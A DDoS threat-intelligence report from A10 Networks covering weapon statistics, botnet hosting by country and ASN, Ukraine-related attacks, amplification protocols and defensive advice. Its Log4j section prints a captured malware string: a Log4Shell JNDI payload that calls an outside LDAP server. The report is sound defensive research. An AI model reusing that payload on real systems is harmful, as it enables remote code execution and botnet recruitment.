Security Research
The Global State of DDoS Weapons, Threat Intelligence and Attack Mitigation

2022 DDoS Threat Report May2022

©2022 A10 Networks, Inc. All rights reserved.

The COVID-19 pandemic provided a perfect storm for threat actors to intensify their efforts to disrupt services people use everyday like healthcare and education while also targeting critical infrastructure like supply chains. Even while the world eases into a more normal operating environment, cyber attacks, including state-sponsored attacks, only continue to increase.
A10 Networks security research team tracks distributed denial of service (DDoS) weapons and their nature and origins on an ongoing basis. The 2022 A10 Networks DDoS Threat Report provides insights into DDoS activity during the past six months including origins of activity; the growth of DDoS weapons and botnets; the role of malware in the propagation of DDoS weapons and attacks; and the steps organizations can take to protect against such activities.
2022 DDoS Threat Intelligence Report 2

01.
DDoS Threats and Patterns in 2021
A10 Networks monitors and documents potential DDoS weapons and their behavior and provides threat intelligence to ensure DDoS attacks can be mitigated regardless of the country or organization of origin.
15.4M DDoS Weapons Tracked by A10 Networks in 2021
2x YoY Growth of Obscure Weapons
As noted here, among other key findings, there was a dramatic increase in more obscure protocols like Apple Remote Desktop (ARD), which was used in the cyber attacks on Ukraine (see the special report on page 5) and commonly used protocols like Network Time Protocol (NTP) or Connectionless Lightweight Directory Access Protocol (CLDAP), which played a key role in major cyber attacks, like the 2.3 Tbps AWS attack in 2020.
©2022 A10 Networks, Inc. All rights reserved.

More than
75% Log4j Scanners originated from Russia

2x More than DDoS Weapons are hosted in North America per person compared to Asia

2022 DDoS Threat Intelligence Report 3

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

During the 2H 2021 reporting period, the Log4j vulnerability arose as a key concern for organizations worldwide. The report details its role in the creation of DDoS botnets. To that end, A10 Networks provides recommendations on how organizations can protect against cyber attacks by employing Zero Trust principles to take quick remedial actions and isolate compromised systems.
©2022 A10 Networks, Inc. All rights reserved.

Cyber attacks are becoming more sophisticated while becoming easier than ever to launch. Organizations need to realign their security strategies and integrate modern automated defenses sooner rather than later.
Rich Groves Director of Security Research, A10 Networks
2022 DDoS Threat Intelligence Report 4

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

02.
Special Report: Cyber Warfare in the Russia-Ukraine Conflict
The ongoing conflict in Ukraine is an example of state-sponsored cyber warfare where cyber attacks like DDoS are being used not just as arbitrary tools of distraction or disruption in peacetime, but rather as closely coordinated attacks that compliment the physical confrontation on the ground.
©2022 A10 Networks, Inc. All rights reserved.

DDoS Attacks Disrupt Critical Infrastructure and Communications
Cyber warfare is often thought of as the use of cyber attacks by nation-states or international organizations like Anonymous to disrupt government and other critical services. DDoS attacks have been used in the past by state-sponsored attackers as part of their cyber warfare tactics to effectively target critical infrastructure, such as utilities, phone and transportation services, or to stop communications between individuals or government bodies.
At the outset of the conflict between Russia and Ukraine, the A10 security research team observed significant and sustained attacks on Ukrainian government networks and commercial internet assets, with a massive spike on the first day of the conflict.

UKRAINE

Heat map showing DDoS attacks
on multiple targets in Ukraine

2022 DDoS Threat Intelligence Report 5

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

The events that have unfolded during this conflict highlight the new realities. Cyber warfare will likely continue to be used alongside physical war tactics in conflicts of the future. It is important for all nations and stakeholders to stay vigilant.
©2022 A10 Networks, Inc. All rights reserved.

Many networks were targeted by a coordinated DDoS amplification and reflection attack. However, upon filtering the information, two particular targets stood out: The first target, PP Infoservis-Link, was somewhat obfuscated by the name returned from the automated look-up, and upon a closer look, one source listed this as geolocated to one of Ukraine's largest cities -- Kharkiv, while the whois information showed it as Severodonetsk, Ukraine. It was targeted by requests with the less common Apple Remote Desktop (ARD) protocol on UDP port 3,283. This protocol has an amplification factor of 34 -- a response size 34 times larger than the original request.
The second target, the Secretariat of the Cabinet of the Ministers of Ukraine, was likely a state-sponsored campaign.
In the second attack, a Network Time Protocol request was used for the DDoS amplification and reflection attack on UDP port 123. This is a common method of attack.
Both of these attacks, carried out on February 24, 2022, were extremely large in scale. However, there were consistent levels of smaller attacks against targets in Ukraine from a variety of UDP protocols. The A10 security research team will continue to track the cyber attack activity in the region and will provide updates on an ongoing basis and in the next edition of this report. More detailed information about the initial cyber attack activity can be found on A10 Networks' blog.
2022 DDoS Threat Intelligence Report 6

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

©2022 A10 Networks, Inc. All rights reserved.

03.
DDoS Weapons Trends
A10 Networks' security research team gathers weapons intelligence by closely monitoring attack agents under the control of botnet command and control (C2); discovering malware innovations by deploying honeypots; intercepting self-replicating botnets; and scanning the internet for exposed reflected amplification sources.
Unique DDoS Weapons Tracked by A10 Networks
Approximately
15.4 Million
2022 DDoS Threat Intelligence Report 7

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

DDoS weapons tracked by A10 Networks almost tripled in two years.
Total Number of DDoS Weapons (Millions)

5.9M H2 2019

+112% YoY
12.5M
H2 2020

+23% YoY
15.4M

+161%
Overall growth, which includes
reflected amplification weapons and
botnet agents available for exploit.

H2 2021

The Simple Service Discovery Protocol (SSDP), a dangerous and potent DDoS weapon, remained at the top with the most potential weapons exposed to the internet.
Simple Network Management Protocol (SNMP), Portmap, Domain Name System (DNS) Resolvers and Trivial File Transfer Protocol (TFTP) remained at their positions rounding out the top-five.

©2022 A10 Networks, Inc. All rights reserved.

2022 DDoS Threat Intelligence Report 8

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

©2022 A10 Networks, Inc. All rights reserved.

Top Tracked DDoS Weapons by Size

+100% YoY

+13% YoY
2.9M SSDP
2,923,076

+15% YoY
2.0M PORTMAP
2,023,078

+6% YoY
1.88M SNMP
1,881,015

-6% YoY
1.59M DNS Resolvers
1,597,892

+9% YoY
1.54M TFTP
1,547,171

6.4M
Others
6,441,154+

Millions of IP addresses of exploited hosts used in DDoS attacks are accumulated in feeds that can be consumed by A10's DDoS protection solutions. Organizations then have the ability to implement surgical security and DDoS attack mitigation policies.
It is important to note that while the report looks at the top-five in many of the weapons categories, devastating attacks can come from any vector, particularly for amplification attacks where the amplification factor of a given protocol dictates its efficacy as a weapon.

2022 DDoS Threat Intelligence Report 9

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

04.
Top Sources of DDoS Weaponry
2M+
For the last year, China consistently led the list of countries that hosted the most DDoS weapons: more than two million amplification weapons and botnet agents.
©2022 A10 Networks, Inc. All rights reserved.

DDoS Attacks are Distributed in Nature
A single attack may employ multiple DDoS weapons and vectors to overwhelm the victim's network and defenses. Even though a single attack might be using attack nodes spread across the globe, there is still value in knowing the origin of these weapons as this information can help organizations create better and more precise DDoS protection policies.
A10 Networks' security research team tracks potential DDoS weapons and their behavior and makes sure that the origins of these weapons can be traced back to the country and organization in which they are hosted.
Top Countries/Regions Hosting DDoS Weapons
DDoS attacks are not limited to a specific geographical location. These attacks are powered by weapons that are distributed globally. Higher concentrations are found where internet-connected populations are most dense.

Top-five Countries Hosting the Most DDoS Weapons (Millions)

China

U.S.A

South Korea

Italy

Russia

Rest of World

8,333,728+

809,978

974,011

1,328,823

1,846,075

2 ,1 0 5 , 0 4 4

+1

-1

2022 DDoS Threat Intelligence Report 10

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

2x
North America has twice as many DDoS weapons per person compared to Asia.
©2022 A10 Networks, Inc. All rights reserved.

No Correlation Between Population and Number of DDoS Weapons
Regions with more sophisticated internet infrastructure and connected populations host more compromised devices than others, regardless of their population.
North America Population
579 Million
DDoS Weapons Per Person: .004

Asia Population
4.561 Billion
DDoS Weapons Per Person: .002

2022 DDoS Threat Intelligence Report 11

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

4.5%
China Telecom topped the list with an increase of 4.5%.
©2022 A10 Networks, Inc. All rights reserved.

Top ASNs Hosting DDoS Weapons
An autonomous system number (ASN) is a collection of IP addresses under the control of a single administrative operator/organization. Large numbers of weapons belonging to their users can remain connected to their network and play a role in attacking other systems.

Top-five ASNs Hosting DDoS Weapons

China Telecom

Korea Telecom

Wind Tre Italy

China Unicorn CN

CANTV Venezuela

Others

8,947,235+

465,710

572,804

675,949

831,039

918,870

New

-1

-1

The list remains largely unchanged since the last reporting period.
· China Telecom topped the list with an increase of 4.5 percent · Italy appeared for the first time with addition of Wind Tre

2022 DDoS Threat Intelligence Report 12

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

©2022 A10 Networks, Inc. All rights reserved.

05.
Tracking DDoS Botnet Agents
Computers, servers, routers, cameras, and other IoT devices infected by malware and under the control of a malicious actor are prized tools for DDoS attackers. These weapons, referred to as drones, bots or botnets, can easily be sourced from different locations, depending on the attacker's requirements.
Botnet Agents Tracked
Approximately
423,096
A10 Networks tracks bots that are repeatedly used in DDoS attacks and scans for hosts exhibiting malware-infected characteristics, such as scanning behavior, where hosts are actively looking for vulnerabilities to exploit. High-activity hubs are also tracked to help organizations protect their systems from DDoS attacks that might be sourced from these botnets.
2022 DDoS Threat Intelligence Report 13

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

Bot activity typically changes with each reporting period. In H2 2021, an 8% decrease in the total number of bots was observed. When organizations become aware of malicious activity in their networks, they take remedial actions and the infected systems are taken down. In some cases, such measures are taken by outside entities including law enforcement agencies or vigilantes. Increases and decreases in botnets can be attributed to:

· The growth of IoT and availability of new IoT devices · New vulnerabilities and CVEs exploited by attackers · Large-scale security updates to patch
CVEs in IoT devices · Botnet takedowns

At 34%, China hosts the largest number DDoS botnet agents globally.

©2022 A10 Networks, Inc. All rights reserved.

40% Rest of the World

34%
China

5% Egypt 5% 6%
Mexico USA

10%
India

Top Countries/Regions Hosting DDoS Botnet Agents

2022 DDoS Threat Intelligence Report 14

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

©2022 A10 Networks, Inc. All rights reserved.

Top ASNs Hosting DDoS Botnet Agents
The list of top ASNs hosting botnet agents can be very dynamic, primarily because of the distributed nature of DDoS attacks and the weapons they use.

China Unicom, CN
China Telecom

18% 11%

TE Data Egypt

5%

BSNL India

5%

Axtel

4%

Mexico

Others

57%

Typically, organizations in the top-five remain consistent; Egypt's TE Data is new in this reporting period.

2022 DDoS Threat Intelligence Report 15

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

06.
The Apache Log4j Vulnerability and DDoS
©2022 A10 Networks, Inc. All rights reserved.

A New Vector for Weapon Creation
Apache Log4j is a logging framework used for recording security and performance information and communicating diagnostic messages to system administrators. It is used by thousands of Java packages in a variety of consumer and enterprise products.
The disclosure of CVE-2021-44228 on December 10, 2021 was a real cause for concern as the scale of Log4j's use could extend to potentially billions of devices around the world.
According to NIST, the Java Naming and Directory Interface (JNDI) features within Log4j, used in configuration and logging, can easily be hijacked by attackers who can control log messages or log message parameters to execute malicious code loaded from LDAP servers. This is possible when the "message lookup substitution" option is enabled. Carrying out unauthenticated remote code executions (RCE) to install malware using Log4j is therefore very easy and this behavior was observed within the first few days after the disclosure of the CVE.
2022 DDoS Threat Intelligence Report 16

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

75%
of all scanning was sourced from Russia
©2022 A10 Networks, Inc. All rights reserved.

Initial Behavior
As early as December 9, 2021, the A10 security research team began scanning for hosts that were affected by this CVE.

20,000 15,000 10,000 5,000
0 2021
12-04 17:00

2021
12-08 17:00

2021
12-12 17:00

2021
12-16 17:00

2021
12-20 17:00

2021
12-24 17:00

2021
12-28 17:00

Russia South Korea Brazil Germany United States

Netherlands Poland Canada India Luxembourg

After the first week of activities, this scanning became far more distributed.

2022 DDoS Threat Intelligence Report 17

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

By December 20, 2021, A10 research honeypots began detecting binaries containing clear signs that Log4j was being used for viral spread.
©2022 A10 Networks, Inc. All rights reserved.

aGetHttpllrncon :

db "GET / HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding:gzip, deflate\r\nAccept:/\r\nUser-Agent:

${jndi:ldap://179.43.175.101:1389/gm7unt}\r\n\r\n"

db 0x00 ; '.'

db 0x00 ; '.'

db 0x00 ; '.'

db 0x00 ; '.'

zDATA XREF=sub _ ld818, dword _ ld824

db 0x00 ; '.'

db 0x00 ; '.'

db 0x00 ; '.'

Binaries Leveraging the Log4j Vulnerability

The Log4j Attack Toolkit

These binaries contained no other infection vectors other than the standard set of default usernames and passwords used to infect devices. However, they did contain symbols describing a functional toolkit of attacks. While these attacks were not new, they had the potential to create very large botnets capable of carrying out large-scale DDoS attacks.
Decreasing the spread of malware is vital and clearly the clean-up effort needed is well-understood.
2022 DDoS Threat Intelligence Report 18

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

Recommended Protective Actions to Address Log4j Vulnerabilities Protect networks and resources against the Log4j vulnerability using these following steps.
For more information on the Log4j vulnerability, visit the following links:
A10 SIRT Security Advisory NIST NVD Vulnerability Details CISA Log4j Guidance CISA GitHub Repository
©2022 A10 Networks, Inc. All rights reserved.

Identify and Isolate

1

Immediately identify and isolate products with the Log4j vulnerability. This can be done in multiple ways including disconnecting the affected devices from the network or creating a VLAN used to

separate affected devices.

Ensure Your Security is up to Date

2

Make sure that all devices are updated with the latest version of Log4j, that security infrastructure is updated regularly and that devices are running the latest version of firmware. Keep track of relevant

CVEs and seek out help if any patches are required. If fixes are not readily available, take appropriate

action based on the particular CVE.

Never Trust, Always Verify

3

Incorporate the Zero Trust model and its key principles into the organization's security strategy. Create micro-perimeters within networks. Limit access to resources and invest into modern,

AI/ML-based solutions. Ensure visibility into not only the endpoints and network nodes, but also

into users, their activities, and workflows.

Take a Closer Look at the Payloads

4

If network devices are unexpectedly generating large amounts of traffic, look at the payloads (i.e., the HTTP GET as in the example above). RegEx can be used to filter these malicious traffic

requests out and block them before they infect other devices.

Employ or Review DDoS Baselining and AI/MLTechniques

5

Using modern DDoS techniques like baselining to see anomalous behavior versus historical norms, and AI/ML techniques, for automated detection and mitigation of attacks, can be a force

multiplier for your security teams, giving them a much needed reprieve and helping them focus

on novel events.

2022 DDoS Threat Intelligence Report 19

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

01. DDoS Threats

02. Special Report

03. DDoS Trends

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

Total Amplification Attack Weapons
15 Million

07.
Amplification Attacks and Weapons
Amplified reflection attacks result in some of the largest DDoS attacks. This attack strategy is to exploit the connectionless nature of the UDP protocol and spoof the victim's IP address.
While DDoS attackers are increasingly focused on smaller attacks launched persistently over a long period of time, the notoriety and capabilities of large-scale DDoS attacks cannot be diminished. Large-scale attacks, while less frequent, can still cause significant damage. While these large-scale attacks might not be as lucrative as continuously attacking an organization over time, they are used to make a statement. In the current environment state-sponsored cyber warfare and cyber activism are becoming much more common.

07. Amplification

08. Conclusion

©2022 A10 Networks, Inc. All rights reserved.

2022 DDoS Threat Intelligence Report 20

Leveraging Amplification Factors of Common Protocols
Amplified reflection attacks leverage the amplification factors of common protocols and services used across the internet. The most common types of these attacks can use millions of exposed DNS, NTP, SSDP, SNMP, and CLDAP UDP-based services.
Attackers send multiple requests to these services, spoofing the victim's IP address. The servers reply with large amplified responses. These particular servers are targeted because they answer to unauthenticated requests and are running applications or protocols with amplification capabilities. This has resulted in record-breaking volumetric attacks.
©2022 A10 Networks, Inc. All rights reserved.

The SSDP protocol had the most systems exposed to the internet
Approximately
3,000,000
2022 DDoS Threat Intelligence Report 21

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

Methods for Exploiting SSDP
The Simple Service Discovery Protocol is used for advertising and discovering network services. It is the basis of the discovery protocol Universal Plug and Play (UPnP). SSDP-based DDoS attacks exploit the protocol by spoofing the victim's IP address and sending a large volume of response traffic reflected off plug-and-play devices open to the internet. The response generated can be larger than 30 times the request size. This large volume of traffic can make systems and organizations unresponsive or take them offline completely.
30x
SSDP-based DDoS attacks can generate more than 30x traffic volume making them some of the most devastating attacks.
Preventing SSDP-based DDoS Attacks
Unless there is a specific use case for SSDP across the internet, the most straightforward way to prevent these attacks is to block port 1900 traffic sourced from the internet. Alternatively, block SSDP traffic from specific geo-locations where a large number of botnet activity has been detected. These one or two steps provide surgical and preemptive protection against this type of DDoS attack.
©2022 A10 Networks, Inc. All rights reserved.

2022 DDoS Threat Intelligence Report 22

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

Top Countries/Regions Hosting Reflected Amplification Attack Weapons

SSDP Country/Region South Korea Venezuela China Taiwan Brazil

Unique Sources 500,682 464,663 346,767 2 4 0 ,1 2 1 202,926

Trends

PORTMAP
Country/Region
U.S.A China Japan Russia Germany

Unique Sources 6 5 0 ,1 2 8 300,052 81,622 80,636 7 9,7 8 5

Trends
New -1 +1

DNS Resolvers Country/Region China U.S.A Russia Taiwan Vietnam

Unique Sources 592,973 135,462 1 2 6 ,9 1 4 5 7, 3 9 9 43,619

©2022 A10 Networks, Inc. All rights reserved.

Trends
New

TFTP Country/Region South Korea Russia U.S.A Iran India

Unique Sources 266,084 207,059 130,873 105,318 100,633

Trends
New New

SNMP Country/Region U.S.A South Korea Iran Brazil China

Unique Sources 252,882 2 3 9,9 3 3 115,843 106,309 104,688

Trends
+2 -1 -1

2022 DDoS Threat Intelligence Report 23

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

08.
Conclusion
©2022 A10 Networks, Inc. All rights reserved.

While the world eases into a more normal operating environment, cyber-attacks, including state-sponsored attacks, will only continue to intensify. As we have witnessed, going back dozens of years, DDoS attacks are used as arbitrary tools of distraction or disruption for financial gain or to make a statement. And this year, we've seen clear evidence that closely coordinated attacks are being used as a complement to a physical confrontation on the ground.
A proactive approach to DDoS defense is essential to ensure critical services and infrastructure are protected.

A10 Networks Recommends:

Implementing Zero Trust strategies to identify and isolate problem areas.

Using modern AI/ML-based automated DDoS defenses to protect against all DDoS attacks including zero-day attacks, large-scale amplification attacks, and low-volume persistent DDoS attacks.

Monitoring devices, traffic, and users to ensure networks are not weaponized and used against the internet.

2022 DDoS Threat Intelligence Report 24

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

A10's DDoS Threat Intelligence
Sophisticated DDoS threat intelligence, combined with real-time threat detection, artificial intelligence (AI)/machine learning (ML) capabilities, and automated signature extraction, allow organizations to defend against all kinds of DDoS attacks, ranging from low-volume, high-frequency persistent attacks to massive multi-vector DDoS attacks, no matter where they originate. Actionable DDoS weapons and threat intelligence enables a proactive approach to DDoS attack mitigation by creating blacklists based on current and accurate feeds of the IP addresses of DDoS botnets and available vulnerable servers commonly used for DDoS attacks.
A10 Networks' security researchers are at the forefront of DDoS weapons intelligence. A10 delivers a comprehensive and converged system to enable organizations to achieve full-spectrum DDoS protection.
To learn more about A10 Networks DDoS weapons intelligence, visit our DDoS threat map at: threats.A10networks.com
©2022 A10 Networks, Inc. All rights reserved.

2022 DDoS Threat Intelligence Report 25

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

Glossary of Threats
©2022 A10 Networks, Inc. All rights reserved.

DDoS Weapons
Reflected Amplification DDoS Attacks
Reflected Amplification Weapons
Drone Systems
DDoS Botnet Weapons
Remote Code Execution (RCE)
Common Vulnerabilities and Exposures (CVE)

Computers, servers and IoT devices that can potentially be used in DDoS attacks.
DDoS attacks that leverage vulnerabilities in the UDP protocol to spoof the target's IP address and exploit vulnerabilities in servers that initiate reflected response. This strategy amplifies the attack by producing server responses that are much larger than the initial requests.
Servers openly available on the internet that can be used in reflected amplification DDoS attacks.
Malware-infected computers, servers, and IoT devices that are under the control of a bot herder. These devices can be a part of a single or multiple botnets.
Multiple drone systems grouped together into a botnet that can be used to initiate stateful and stateless volumetric, network, and application-layer DDoS attacks.
A vulnerability in computers, servers and IoT devices that can be exploited by attackers running a malicious code of their choice with system-level privileges, using the victim device for DDoS attacks or drone recruitment.
The Common Vulnerabilities and Exposures (CVE) system keeps a public record of, and provides a reference method for the most commonly known cyber security vulnerabilities and exposures. It also assigns and lists CVE IDs, with details on the vulnerabilities.
2022 DDoS Threat Intelligence Report 26

08. Conclusion

07. Amplification

04. Top Weapons 05. Tracking Botnets 06. Apache Log4j

03. DDoS Trends

02. Special Report

01. DDoS Threats

About A10 Networks
A10 Networks (NYSE: ATEN) provides secure application services for on-premises, multi-cloud and edge-cloud environments at hyperscale. Our mission is to enable service providers and enterprises to deliver business-critical applications that are secure, available and efficient for multi-cloud transformation and 5G readiness. We deliver better business outcomes that support investment protection, new business models and help future-proof infrastructures, empowering our customers to provide the most secure and available digital experience. Founded in 2004, A10 Networks is based in San Jose, Calif. and serves customers globally.
For more information, visit A10networks.com and follow us @A10Networks.

Learn More
About A10 Networks
Contact Us
A10networks.com/contact

©2022 A10 Networks, Inc. All rights reserved. A10 Networks, the A10 Networks logo, ACOS, Thunder, Harmony and SSL Insight are trademarks or registered trademarks of A10 Networks, Inc. in the United States and other countries. All other trademarks are property of their respective owners. A10 Networks assumes no responsibility for any inaccuracies in this document. A10 Networks reserves the right to change, modify, transfer, or otherwise revise this publication without notice. For the full list of trademarks, visit: A10networks.com/A10-trademarks.
Part Number: A10-EB-14115-EN-10 MAY 2022

